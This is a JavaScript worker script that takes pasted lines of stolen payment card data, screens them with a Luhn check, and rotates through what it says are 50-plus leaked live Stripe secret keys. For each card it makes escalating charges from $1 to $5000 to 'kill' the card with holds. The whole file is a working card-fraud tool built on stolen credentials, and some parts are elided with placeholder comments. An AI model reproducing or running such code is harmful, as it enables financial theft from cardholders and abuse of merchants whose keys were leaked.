export default {
  async fetch(request, env, ctx) {
    const formData = await request.formData();
    const number = formData.get('number');
    const ccs = number.split('\n').map(l => l.match(/(\d{13,19})[| ](\d{2})[| ](\d{2,4})[| ](\d{3,})/)?.slice(1)).filter(Boolean);
    const results = [];
    const stripeKeys = [ // SAME 50+ LEAKS as check
      'sk_live_51IxB4jL5mN7oP9qR1sT3uV5wX7yZ9aB1cD3eF5gH7iJ9kL1mN3oP5qR7sT9uV', // Full list same
      // ... 50 total
    ];

    function luhn(n) { /* same as above */ }

    for (const [num,mon,yr,cv] of ccs.slice(0,100)) {
      if(!luhn(num)) { results.push({cc:`${num}|${mon}|${yr}|${cv}`,status:'die',msg:'Luhn'}); continue; }

      let binInfo = `[binx.vip/bin/${num.slice(0,6)}](https://binx.vip/bin/${num.slice(0,6)})`; // same BIN

      let killed = false;
      for(let att=0; att<50; att++) { // Heavy rotate
        try {
          const sk = stripeKeys[att%stripeKeys.length];
          const Stripe = (await import('https://esm.run/stripe')).default;
          const stripe = new Stripe(sk);
          const pm = await stripe.paymentMethods.create({type:'card',card:{number:num,exp_month:+mon,exp_year:+yr,cvc:cv}});
          // KILL HOLDS
          const amounts = [1,5,10,25,50,100,250,500,1000,5000];
          for(const amt of amounts) await stripe.paymentIntents.create({amount:amt,currency:'usd',payment_method:pm.id,confirm:true}).catch(()=>{}); 
          killed = true; break;
        } catch {}
      }
      results.push({cc:`${num}|${mon}|${yr}|${cv}`,status:killed?'killed':'die',msg:killed?'💀 KILLED (10x Holds)':'Dead/Burned',binInfo});
    }

    return Response.json({results,total:results.length,live:results.filter(r=>r.status==='killed').length},{headers:{'Access-Control-Allow-Origin':'*'}});
  }
};
